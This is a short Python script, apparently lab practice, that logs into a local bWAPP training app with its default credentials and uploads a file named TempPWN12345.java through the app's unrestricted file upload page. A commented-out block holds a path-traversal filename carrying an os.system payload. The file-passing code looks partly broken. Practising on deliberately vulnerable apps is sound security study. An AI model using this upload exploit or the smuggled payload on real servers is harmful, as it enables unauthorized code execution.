#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests

#ip = sys.argv[1]
ip = '192.168.0.104'

auth_data = {
    'login': 'bee',
    'password' : 'bug',
    'security_level' : '0',
    'form' : 'submit'
}

submit = {
    'form' : 'submit'
}

s = requests.Session()


html = s.post('http://{}/bWAPP/login.php'.format(ip), data=auth_data)

file = open('TempPWN12345.java', 'rb')
print(file)

#files = {'picture': ('image.png', open('image.png', 'rb'), 'image/png')} #file-type and file-name

#files={
#    'file': (
#        "../perms.json",
#        """__import__("os").system("echo 'hacked' > kek")"""
#    )
#}

data = {
        'email': 'email',
        'password': 'password',
}


print(s.post('http://{}/bWAPP/unrestricted_file_upload.php'.format(ip),files=file,data=data).text)
